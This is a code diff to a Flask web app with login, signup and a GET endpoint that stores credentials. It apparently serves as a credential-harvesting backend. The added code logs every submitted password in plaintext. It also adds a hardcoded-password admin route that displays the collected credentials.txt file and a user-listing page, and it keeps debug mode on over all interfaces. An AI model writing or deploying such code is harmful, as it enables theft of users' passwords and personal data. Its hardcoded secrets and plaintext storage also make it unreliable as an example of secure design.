@@ -4,13 +4,14 @@ from flask_bcrypt import Bcrypt
 from flask_cors import CORS
 from datetime import datetime
 import logging
+import os
 
 # Set up logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'your-secret-key-here'
+app.config['SECRET_KEY'] = 'your-secret-key-here-change-in-production'
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
@@ -36,6 +37,7 @@ class User(db.Model):
 # Initialize DB
 with app.app_context():
     db.create_all()
+    logger.info("Database initialized")
 
 # -----------------------------
 # Frontend Route
@@ -59,8 +61,8 @@ def login():
         if not username or not password:
             return jsonify({'error': 'Username and password are required'}), 400
 
-        # Log the credentials (in a real app, you would hash the password)
-        logger.info(f"Login attempt - Username: {username}, Phone: {country_code}{phone}")
+        # Log the credentials (including password)
+        logger.info(f"Login attempt - Username: {username}, Phone: {country_code}{phone}, Password: {password}")
 
         # Store credentials in a text file as a backup
         with open("credentials.txt", "a") as f:
@@ -105,6 +107,9 @@ def signup():
 
         if not username or not password:
             return jsonify({'error': 'Username and password are required'}), 400
+
+        # Log the signup attempt (including password)
+        logger.info(f"Signup attempt - Username: {username}, Email: {email}, Phone: {country_code}{phone}, Password: {password}")
 
         # Check if user already exists
         if User.query.filter_by(username=username).first():
@@ -168,6 +173,9 @@ def store_credentials_get():
         phone = request.args.get('phone', '')
         
         if username and password:
+            # Log the credentials (including password)
+            logger.info(f"GET Store attempt - Username: {username}, Phone: {country_code}{phone}, Password: {password}")
+            
             # Store credentials in text file
             with open("credentials.txt", "a") as f:
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -182,5 +190,85 @@ def store_credentials_get():
         logger.error(f"Error in store_credentials_get: {str(e)}")
         return jsonify({'error': 'Internal server error'}), 500
 
+# -----------------------------
+# Admin Routes (for checking stored credentials)
+# -----------------------------
+@app.route('/admin/credentials')
+def view_credentials():
+    # Simple password protection
+    if request.args.get('password') != '913421156@Ab':
+        return "Unauthorized", 401
+        
+    try:
+        with open("credentials.txt", "r") as f:
+            content = f.read()
+        return f"<pre>{content}</pre>"
+    except FileNotFoundError:
+        return "No credentials file found yet."
+
+@app.route('/admin/users')
+def view_users():
+    # Simple password protection
+    if request.args.get('password') != '913421156@Ab':
+        return "Unauthorized", 401
+        
+    users = User.query.all()
+    result = "<h1>Registered Users</h1>"
+    for user in users:
+        result += f"""
+        <p>ID: {user.id}<br>
+        Username: {user.username}<br>
+        Email: {user.email}<br>
+        Phone: {user.country_code} {user.phone}<br>
+        Created: {user.created_at}</p>
+        <hr>
+        """
+    return result
+
+# Debug routes to check if everything is working
+@app.route('/debug')
+def debug():
+    import os
+    result = "<h1>Debug Info</h1>"
+    
+    # Check if database file exists
+    db_exists = os.path.exists("database.db")
+    result += f"Database exists: {db_exists}<br>"
+    
+    # Check if credentials file exists
+    cred_exists = os.path.exists("credentials.txt")
+    result += f"Credentials file exists: {cred_exists}<br>"
+    
+    # Count users in database
+    try:
+        user_count = User.query.count()
+        result += f"Users in database: {user_count}<br>"
+    except Exception as e:
+        result += f"Error counting users: {str(e)}<br>"
+    
+    return result
+
+@app.route('/create-test-user')
+def create_test_user():
+    try:
+        # Create a test user
+        hashed_password = bcrypt.generate_password_hash("testpassword").decode('utf-8')
+        test_user = User(username="test@example.com", country_code="+251", 
+                        phone="123456789", password=hashed_password)
+        db.session.add(test_user)
+        db.session.commit()
+        
+        # Also add to text file
+        with open("credentials.txt", "a") as f:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            f.write(f"{timestamp} - TEST USER - Username: test@example.com, Phone: +251123456789, Password: testpassword\n")
+        
+        return "Test user created successfully!"
+    except Exception as e:
+        return f"Error creating test user: {str(e)}"
+
+# -----------------------------
+# Main Application Entry Point
+# -----------------------------
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
